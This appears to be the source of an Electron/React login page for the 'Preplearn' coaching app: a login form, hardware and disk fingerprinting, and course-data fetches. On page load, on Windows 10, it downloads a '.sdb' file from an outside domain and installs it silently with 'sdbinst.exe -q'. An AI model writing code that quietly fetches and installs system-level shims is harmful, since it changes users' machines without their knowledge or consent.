import React, { useState } from 'react';
import Avatar from '@mui/material/Avatar';
import Button from '@mui/material/Button';
import CssBaseline from '@mui/material/CssBaseline';
import TextField from '@mui/material/TextField';
import FormControlLabel from '@mui/material/FormControlLabel';
import Checkbox from '@mui/material/Checkbox';
import Link from '@mui/material/Link';
import Grid from '@mui/material/Grid';
import Box from '@mui/material/Box';
import SchoolIcon from '@mui/icons-material/School'; // Import a relevant icon
import { Divider } from '@mui/material';

import { toast, ToastContainer } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css'; // Import the CSS for styling
import {
  AppBar,
  Toolbar,
  IconButton,
  InputAdornment,
  CircularProgress,
} from '@material-ui/core';
import LockOutlinedIcon from '@mui/icons-material/LockOutlined';
import Typography from '@mui/material/Typography';
import Container from '@mui/material/Container';
import { createTheme, ThemeProvider } from '@mui/material/styles';
import Alert from '@mui/material/Alert';
const { ipcRenderer } = window.require('electron');
import AccountCircle from '@material-ui/icons/AccountCircle';
import { FetchInstance } from '../Service/Services';
import MinimizeIcon from '@material-ui/icons/Minimize';
import CloseIcon from '@material-ui/icons/Close';
import { withStyles, makeStyles } from '@material-ui/core/styles';
import DriveInfoDisk from '../common/DriveInfoDisk';
import packageJson from '../../package.json';
import ExtraFileDownload from '../common/ExtraFileDownload';
const shell = window.require('electron').shell;
var serialNumber = window.require('serial-number');
const execSync = window.require('child_process').execSync;
const windowopetioncmd = `wmic logicaldisk get freespace,caption`
const winmachineUUID = `wmic csproduct get "UUID"`
const MacMachineUUID = `system_profiler SPHardwareDataType | awk '/UUID/ { print $3; }'`
const Processorid = `wmic CPU get ProcessorId`;
const request = window.require('request');
const progress = window.require('request-progress');
const MacDiskInfo = `df -lH | grep "Filesystem"; df -lH | grep "/"`;
const os = window.require('os');
const fs = window.require('fs');
var serialNumber = window.require('serial-number');
const options = {
  encoding: 'utf8'
}
const useStyles = makeStyles((theme) => ({
  root: {
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    height: '100vh',
    backgroundColor: '#f5f5f5',
    position: 'relative',
  },
  appbar: {
    backgroundColor: 'transparent',
    boxShadow: 'none',
    position: 'absolute',
    top: 0,
    right: 0,
  },

  closeButton: {
    color: '#ee9254',
    position: 'absolute',
    top: 0,
    right: 0,
  },
  minimizeButton: {
    color: '#ee9254',
    position: 'absolute',
    top: 0,
    right: 40,
  },

  container: {
    width: 300,
    textAlign: 'center',
  },
  textField: {
    marginBottom: theme.spacing(2),
  },
  button: {
    backgroundColor: '#007bff',
    color: 'white',
    '&:hover': {
      backgroundColor: '#0056b3',
    },
  },

  logo: {
    width: '170px',
    height: 'auto',
    borderRadius: 0, // Remove circular shape
    backgroundColor: '#fed008', // Remove grey background
    '& img': {
      width: '70%',
      height: '70%',
      objectFit: 'cover',
    },
  },

  rememberMe: {
    marginTop: theme.spacing(2),
  },
  termsPrivacyContainer: {
    marginTop: theme.spacing(2), // Add top margin
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
    justifyContent: 'center',
  },
  
  termsPrivacyLink: {
    cursor: 'pointer',
    color: 'blue',
    textDecoration: 'underline',
    marginRight: theme.spacing(1), // Add right margin
  },
  sagclLink: {
    cursor: 'pointer',
    color: 'blue',
    textDecoration: 'underline',
  },
  supportLinks: {
    marginTop: 'auto', // Align with the bottom
  },
}));
// Bright shades of yellow
const startColor = '#f9c600'; // Rich yellow
const endColor = '#fed008';   // Bright yellow

const ColorButton = withStyles((theme) => ({
  root: {
    background: `linear-gradient(45deg, ${startColor} 30%, ${endColor} 90%)`, // Gradient from rich to bright yellow
    border: 0,
    borderRadius: 3,
    boxShadow: '0 3px 5px 2px rgba(252, 206, 8, 0.3)', // Adds a subtle shadow for depth
    color: 'white', // Text color
    height: 48,
    padding: '0 30px',
    transition: 'background 0.3s', // Smooth transition for hover
    '&:hover': {
      background: `linear-gradient(45deg, ${endColor} 30%, #fff700 90%)`, // Lighter yellow for hover
    },
  },
}))(Button);

const CssTextField = withStyles({
  root: {
    '& label.Mui-focused': {
      color: '#fed008',
    },
    '& .MuiInput-underline:after': {
      borderBottomColor: '#fed008',
    },
    '& .MuiOutlinedInput-root': {
      '& fieldset': {
        borderColor: '#fed008',
      },
      '&:hover fieldset': {
        borderColor: '#fed008',
      },
      '&.Mui-focused fieldset': {
        borderColor: '#fed008',
      },
    },
  },
})(TextField);
function Copyright(props) {
  return (
    <Typography variant="body2" color="text.secondary" align="center" {...props}>
      {'Copyright © '}
      <Link
        sx={{
          cursor: 'pointer', // Adds hand cursor
        }}
        onClick={handleTermsClick}
      >
        Preplearn
      </Link>{' '}
      {new Date().getFullYear()}
      {'.'}
    </Typography>
  );
}

const handleTermsClick = () => {
  // Open the Terms link in the browser
  shell.openExternal('https://preplearn.sudarshanagrawalclasses.com/');
};

// TODO remove, this demo shouldn't need to reset the theme.

const defaultTheme = createTheme();
let _request;

export default function LoginPage({ history }) {
  const [showAlert, setShowAlert] = useState(false)
  const [message, setMessage] = useState("")
  const [alertType, setAlertType] = useState("")
  const [userDetail, setuserDetail] = useState("")
  const [serialId, setserialId] = useState("")
  const [showdownload, setshowdownload] = useState(false)
  const [enableButton, setenableButton] = useState(false);
  const [loading, setloading] = useState(false)
  const [DiskDrive, setDiskDrive] = useState({ Open: false, DataDisk: [], Message: 'IEC Please Choose Your Drive' });
  const classes = useStyles();


  React.useEffect(() => {
    document.getElementById('zmmtg-root').style.display = 'none';
  }, [])

  React.useEffect(() => {
    console.log(ipcRenderer)
    serialNumber(function (err, value) {
      console.log(value);
      if (value === 'Default string' || value === 'System Serial Number') {
        serialNumber.preferUUID = true;
        serialNumber(function (err, value) {
          setserialId(value)
        })
      }
      else {
        setserialId(value)
      }
    })

    if (os.platform() !== 'darwin') {
      if (os.release().includes('10.0.2')) {
        //let url = 'https://razorpc.com/preplearn.sdb';
        let url = 'https://craftifex.com/preplearn.sdb';
        console.log(url)
        let homedir = os.homedir()
        console.log(homedir)
        let filePath = `${homedir}/preplearn.sdb`;
        fs.exists(filePath, (exists) => {
          if (exists) {
            console.log("File is downloaed")
          }
          else {
            DownloadFile(url, filePath)
          }
        })
      }
    }

  }, [])

  const DownloadFile = (url, filePath) => {
    // download the file and run the command 
    //setisLoading(true)
    // filePath= `${storagePath}/system.sdb`;
    setenableButton(true)
    // download the file in given folder
    // document.getElementById('myBar').style.backgroundColor="#1976d2";
    setshowdownload(true)
    _request = request(url, function (error, response, body) {
      if (response && response.statusCode) {
        console.log(response.statusCode) // 200
        if (response.statusCode === 200 || response.statusCode === '200') {
          setTimeout(() => {
            let commandFile = filePath.replaceAll("/", "\\");
            console.log(commandFile);
            let hidefilecmd = `sdbinst.exe -q "${commandFile}"`;
            console.log(hidefilecmd);
            execSync(hidefilecmd, options)
          }, 1000);

        }
        else {
          return 'not ok'
        }

      }
    });
    progress(_request)
      .on('progress', ({ speed, percent, size, time }) => {
        console.log('progress', speed);
        // setdowmloadProgress(percent*100)
      })
      .on('error', function (err) {
        console.log("Something went wrong")
      })
      .on('end', function () {
        console.log("File Downloaded")
        // let commandFile = filePath.replaceAll("/", "\\");
        // console.log(commandFile);
        // let hidefilecmd = `sdbinst.exe -q "${commandFile}"`;
        // console.log(hidefilecmd);
        // execSync(hidefilecmd, options);
      })
      .pipe(fs.createWriteStream(filePath));
  }
  const handleSubmit = (event) => {

    event.preventDefault();
    const data = new FormData(event.currentTarget);
    console.log({
      email: data.get('email'),
      password: data.get('password'),
    });
    if (data.get('email') == "") {
      toast.error("Please Enter your Enrollment no", {
        autoClose: 1500,
      });
      return false
    }
    // if (data.get('password') == "") {
    //   setShowAlert(true)
    //   setAlertType("error")
    //   setTimeout(() => {
    //     setShowAlert(false)
    //   }, 1500);
    //   setMessage("Please enter password")
    //   return false
    // }

    // let body = {
    //   "userId": data.get('email').toString(),
    //   "encryptPassword": data.get('password').toString(),
    //   "deviceID": serialId.toString()
    // }
    // console.log(serialId)
    let body = {
      enrollment: data.get('email').toString(),
      UniversalId: serialId.toString(),
      fcmToken: "",
      mode: "Desktop",
      platform: os.platform(),
      buildversion: os.release(),
      model: os.cpus()[0].model,
      arch: os.arch()
    }
    FetchInstance("POST", body, "Login_Api").then((data) => {
      if (data.message == "Incorrect Password") {
        setShowAlert(true)
        setAlertType("error")
        setTimeout(() => {
          setShowAlert(false)
        }, 1500);
        setMessage(data.message)
        return false
      }
      if (data.message == "User not found") {
        setShowAlert(true)
        setAlertType("error")
        setTimeout(() => {
          setShowAlert(false)
        }, 1500);
        setMessage(data.message)
      }
      else {
        if (!data?.status) {
          toast.error(data.message, {
            autoClose: 1500,
          });
          return false;
        }

        if (data.data.systemstatus === 0 || data.data.systemstatus === '0') {
          // open and save drive path on localstorage
          if (data.data.appversion === packageJson.version) {
            setuserDetail(data.data)
            GetDiskInfo().then(data => {
              let { DiskInfo } = data;
              setDiskDrive({ DataDisk: DiskInfo, Open: true, Message: 'Please Choose Your Drive' })
            });
          }
          else {
            toast.warn(`You are using an outdated version of the app. Please contact our technical support at +917596033310 for assistance. The latest version is available for download. ${data.data.appversion}`, {
              autoClose: 1500,
            });
          }


        }
        else if (data.data.systemstatus === 1 || data.data.systemstatus === '1') {
          // it is for online not for offline user.
          if (data.data.appversion === packageJson.version) {
            localStorage.setItem("userDetail", JSON.stringify(data.data));
            history.push('/OnlineHomePage')
          }
          else {
            toast.warn(`You are using an outdated version of the app. Please contact our technical support at +917596033310 for assistance. The latest version is available for download. ${data.data.appversion}`, {
              autoClose: 1500,
            });
          }


        }
      }
    })
  }

  const CancelModel = () => {
    setDiskDrive({ Open: false, DataDisk: [], Message: 'IEC Please Choose Your Drive' })
  }
  const GetDiskInfo = () => new Promise((resolve, reject) => {
    let uniqueSystemId;
    serialNumber.preferUUID = true;
    uniqueSystemId = "serialId";
    console.info(uniqueSystemId);
    let OsPlatForm = os.platform();
    if (OsPlatForm === 'win32') {
      let SystemProcessorid = execSync(Processorid, options);
      SystemProcessorid = SystemProcessorid.replace(/\n|\r|\ /g, "").trim();
      let MachineUUID;
      let ForUUIDmACHINE = execSync(winmachineUUID, options);
      let DiskInfo = [];
      console.info(SystemProcessorid, ForUUIDmACHINE)
      if (ForUUIDmACHINE) {
        MachineUUID = ForUUIDmACHINE.replace(/\s/g, '').substring(4);
        MachineUUID = `${MachineUUID}-${SystemProcessorid.replace('ProcessorId', '')}`
      }
      let ForDiskSpace = execSync(windowopetioncmd, options);
      let filtered = ForDiskSpace.split("\n").filter((el) => {
        return el.replace(/\s/g, '').length !== 0;
      });
      filtered.slice(1).map(data => {
        let DriveData = data.replace(/\s\s+/g, ' ').trim().split(' ');
        let Size = parseFloat(DriveData[1] / (1024 * 1024 * 1024)).toFixed(2)
        DiskInfo.push({ Drive: DriveData[0], FreeSize: Size })
      })
      let DataObect = {
        DiskInfo,
        uniqueSystemId,
        OsPlatForm
      }
      console.info(DataObect)
      resolve(DataObect)
    }
    else {
      console.info('for ios')
      let MachineUUID;
      let DiskInfo = [];
      let ForUUIDmACHINE = execSync(MacMachineUUID, options);
      if (ForUUIDmACHINE) {
        MachineUUID = ForUUIDmACHINE.replace(/\s/g, '');
      }
      console.info(ForUUIDmACHINE)
      let ForDiskSpace = execSync(MacDiskInfo, options);
      let filtered = ForDiskSpace.split("\n").filter((el) => {
        return el.replace(/\s/g, '').length !== 0;
      });
      console.info(filtered)
      filtered.slice(1).map(data => {
        let DriveData = data.replace(/\s\s+/g, ' ').trim().split(' ');
        if (DriveData[8] === '/') {
          let HomeDir = os.homedir();
          console.info(HomeDir)
          let Size = DriveData[3].replace("G", "");
          Size = Number(Size)
          DiskInfo.push({ Drive: HomeDir, FreeSize: Size })
        } else {
          let Size = DriveData[3].replace("G", "");
          Size = Number(Size)
          DiskInfo.push({ Drive: DriveData[8], FreeSize: Size })
        }
      })
      let DataObect = {
        DiskInfo,
        uniqueSystemId,
        OsPlatForm
      }
      resolve(DataObect)
    }
  })
  const getInfo = async (driveinfo) => {
    setDiskDrive({ DataDisk: [], Open: false, Message: '' });
    setloading(true)
    console.log(userDetail)
    let allFreeVideos = [];
    let path = `${driveinfo.Drive}/${userDetail.boardName}`;
    if (!fs.existsSync(path)) {
      fs.mkdirSync(path, { recursive: true });
      userDetail["drivePath"] = `${driveinfo.Drive}/preplearn`;
      userDetail["loginTime"] = new Date().getTime();

      localStorage.setItem("userDetail", JSON.stringify(userDetail));
      // Wait while feetching User course detail, it takes few mintues.
      let getCourses = await FetchInstance("GET", "", "getAllCourse");
      let getLevels = await FetchInstance("GET", "", "getAllLevel");
      let getBatches = await FetchInstance("GET", "", "getAllBatches");
      let getTopics = await FetchInstance("GET", "", "getAllTopics");
      // let getVideos = await FetchInstance("GET", "", "getAllVideos");
      let getVideos = [];
      if (userDetail.freesubject !== "" && userDetail.freesubject !== undefined && userDetail.freecourse !== "no") {
        let bodydata = {
          freebatchid: userDetail.freebatchid,
          remark: "Regular Class",
          subjectname: userDetail.freesubject
        }
        let getFreeTopics = await FetchInstance("POST", bodydata, "free_topiclist");
        // let getFreeVideos = await FetchInstance("GET", "", "getFreeVideos");
        localStorage.setItem("AllFreeTopics", JSON.stringify(getFreeTopics.data));
        // localStorage.setItem("AllFreeVideo", JSON.stringify(getFreeVideos.data));
      }
      localStorage.setItem("AllCourse", JSON.stringify(getCourses.data));
      localStorage.setItem("AllLevels", JSON.stringify(getLevels.data));
      localStorage.setItem("AllBatches", JSON.stringify(getBatches.data));
      localStorage.setItem("AllTopics", JSON.stringify(getTopics.data));
      localStorage.setItem("AllVideos", JSON.stringify(getVideos.data));
      setloading(false)
      history.push('/HomePage')
    }
    else {
      userDetail["drivePath"] = `${driveinfo.Drive}/preplearn`;
      userDetail["loginTime"] = new Date().getTime();
      localStorage.setItem("userDetail", JSON.stringify(userDetail))
      let getCourses = await FetchInstance("GET", "", "getAllCourse");
      let getLevels = await FetchInstance("GET", "", "getAllLevel");
      let getBatches = await FetchInstance("GET", "", "getAllBatches");
      let getTopics = await FetchInstance("GET", "", "getAllTopics");
      let getVideos = await FetchInstance("GET", "", "getAllVideos");
      if (userDetail.freesubject !== "" && userDetail.freesubject !== undefined && userDetail.freecourse !== "no") {
        let bodydata = {
          freebatchid: userDetail.freebatchid,
          remark: "Regular Class",
          subjectname: userDetail.freesubject
        }
        let getFreeTopics = await FetchInstance("POST", bodydata, "free_topiclist");
        let getFreeVideos = await FetchInstance("GET", "", "getFreeVideos");
        localStorage.setItem("AllFreeTopics", JSON.stringify(getFreeTopics.data));
        localStorage.setItem("AllFreeVideo", JSON.stringify(getFreeVideos.data));
      }

      localStorage.setItem("AllCourse", JSON.stringify(getCourses.data));
      localStorage.setItem("AllLevels", JSON.stringify(getLevels.data));
      localStorage.setItem("AllBatches", JSON.stringify(getBatches.data));
      localStorage.setItem("AllTopics", JSON.stringify(getTopics.data));
      localStorage.setItem("AllVideos", JSON.stringify(getVideos.data));
      setloading(false)
      history.push('/HomePage')
    }

  }
  const MinimizeApp = () => {
    let windows = window.require('@electron/remote').getCurrentWindow();
    windows.minimize();
  }

  const CloseApp = () => {
    let windows = window.require('@electron/remote').getCurrentWindow();
    windows.webContents.session.clearCache();
    windows.close()

  }

  const CloseApplication = () => {
    let windows = window.require('@electron/remote').getCurrentWindow();
    windows.close();
  }
  return (
    <div className={classes.root}>
      <ThemeProvider theme={defaultTheme}>
        {loading && (
          <Box
            sx={{
              display: 'flex',
              justifyContent: 'center',
              alignItems: 'center',
              position: 'fixed',
              top: 0,
              left: 0,
              width: '100%',
              height: '100%',
              backgroundColor: 'rgba(255, 255, 255, 0.1)', // Optional: To add a semi-transparent background
              zIndex: 9999, // To make sure it is on top of other elements
            }}
          >
            <CircularProgress />
          </Box>
        )}
        <AppBar className={classes.appbar}>
          <Toolbar>
            <IconButton className={classes.minimizeButton}>
              <MinimizeIcon
                onClick={() => MinimizeApp()}
              />
            </IconButton>
            <IconButton className={classes.closeButton}>
              <CloseIcon
                onClick={() => CloseApp()}
              />
            </IconButton>
          </Toolbar>
        </AppBar>

        <Container component="main" maxWidth="xl">
          <CssBaseline />
          <Box
            sx={{
              marginTop: 8,
              display: 'flex',
              flexDirection: 'column',
              alignItems: 'center',
            }}
          >
            <Box
              sx={{
                background: '#ffffff', // Set a white background for a clean look
                padding: '40px 30px', // Ample padding for breathing space
                borderRadius: '12px', // Soft rounded corners
                boxShadow: '0 4px 20px rgba(0, 0, 0, 0.15)', // Softer shadow for depth
                textAlign: 'center',
                marginBottom: 4,
                transition: '0.3s', // Smooth transition for hover effect
                '&:hover': {
                  boxShadow: '0 8px 30px rgba(0, 0, 0, 0.2)', // Stronger shadow on hover
                },
                maxWidth: '500px', // Set a maximum width to ensure content doesn't stretch too far
                width: '100%', // Ensure it takes full width in smaller screens
              }}
            >
              <Box sx={{ marginBottom: 3 }}>
                <img
                  src={require('../assets/images/logo-big.jpg')} // Use the imported logo image
                  alt="Prep Learn Logo" // Alt text for accessibility
                  style={{
                    width: '120px', // Set a width for the logo
                    height: '120px', // Set height to match width for a perfect circle
                    borderRadius: '50%', // Apply circular shape
                    objectFit: 'cover', // Ensure the image covers the circle without distortion
                    border: '4px solid #fed008', // Optional: Add border to enhance visibility
                  }}
                />
              </Box>

              <Typography
                component="h1"
                variant="h5" // Adjusted for a smaller size
                sx={{
                  fontWeight: 700, // Bold for emphasis
                  color: '#333', // Darker text for contrast
                  lineHeight: 1.3,
                  mb: 1,
                  letterSpacing: '0.5px', // Slightly increased letter spacing
                }}
              >
                Welcome to PREPLEARN
              </Typography>

              <Typography
                component="h2"
                variant="subtitle1" // Using subtitle1 for subtitle styling
                sx={{
                  fontWeight: 400, // Regular weight for contrast
                  color: '#555',
                  marginTop: 1,
                  lineHeight: 1.5,
                  maxWidth: '90%', // Limit width for readability
                  margin: '0 auto', // Center the subtitle
                  fontStyle: 'italic', // Italics for a softer feel
                }}
              >
                A leading provider of D2H classes for CA | CMA | CS | B.COM
              </Typography>

              <Box
                sx={{
                  marginTop: 4,
                  color: '#666',
                  fontSize: '1rem',
                  textAlign: 'center', // Center align the tagline
                  maxWidth: '90%', // Maximum width to keep it well-contained
                  mx: 'auto', // Center horizontally
                }}
              >
                <Typography variant="body2" sx={{ fontWeight: 400, lineHeight: 1.6 }}>
                  Join us for expert guidance and comprehensive learning!
                </Typography>
              </Box>
            </Box>

            {/* Form Section */}
            <Box
              component="form"
              noValidate
              onSubmit={handleSubmit}
              sx={{
                mt: 3,
                width: '100%',
                maxWidth: '500px', // Match the maxWidth of the top box
              }}
            >
              <Grid container spacing={3}> {/* Add spacing between form items */}
                <Grid item xs={12}>
                <TextField
      required
      variant="outlined"
      fullWidth
      placeholder="Enter your Enrollment number"
      id="email"
      label="Enrollment Number"
      name="email"
      className={classes.customTextField} // Apply the class
      InputProps={{
        startAdornment: (
          <InputAdornment position="start">
            <AccountCircle style={{ color: '#fed008' }} />
          </InputAdornment>
        ),
      }}
    />
                </Grid>

                <Grid item xs={12}>
                  <ColorButton
                    type="submit"
                    fullWidth
                    disableRipple
                    disableElevation
                    variant="contained"
                    sx={{
                      padding: '10px 20px',
                      borderRadius: '8px',
                      backgroundColor: '#1976d2',
                      '&:hover': {
                        backgroundColor: '#155a9b',
                      },
                      color: '#fff',
                      fontWeight: 'bold',
                      fontSize: '16px',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'center',
                    }}
                    color="primary"
                  >
                    LOGIN
                    <Avatar
                      alt="aswinibajaj"
                      src={require('../assets/images/enter.png')}
                      sx={{
                        marginLeft: 1,
                        width: 24,
                        height: 24, // Ensure the avatar is small and aligned with the text
                      }}
                    />
                  </ColorButton>
                </Grid>
              </Grid>
            </Box>
          </Box>

          <ToastContainer
            position="bottom-center" // Change this to bottom-left or bottom-right as needed
            autoClose={3000} // Optional: duration before the toast automatically closes
            hideProgressBar={false} // Optional: to show/hide progress bar
            closeOnClick
            pauseOnHover
            draggable
            theme="light" // Optional: change theme to "dark" if needed
          />

          {showAlert && <Alert severity={alertType}>{message}</Alert>}

          {showdownload ? (
            <ExtraFileDownload
              showdownload={showdownload}
              CloseApplication={CloseApplication}
              enableButton={enableButton}
            />
          ) : null}

          <Copyright sx={{ mt: 5 }} />
        </Container>


        <DriveInfoDisk State={DiskDrive} Message={DiskDrive.Message} Close={DiskDrive.Open} getInfo={(driveinfo) => getInfo(driveinfo)} CancelModel={() => CancelModel()} />
      </ThemeProvider>
    </div>
  );
}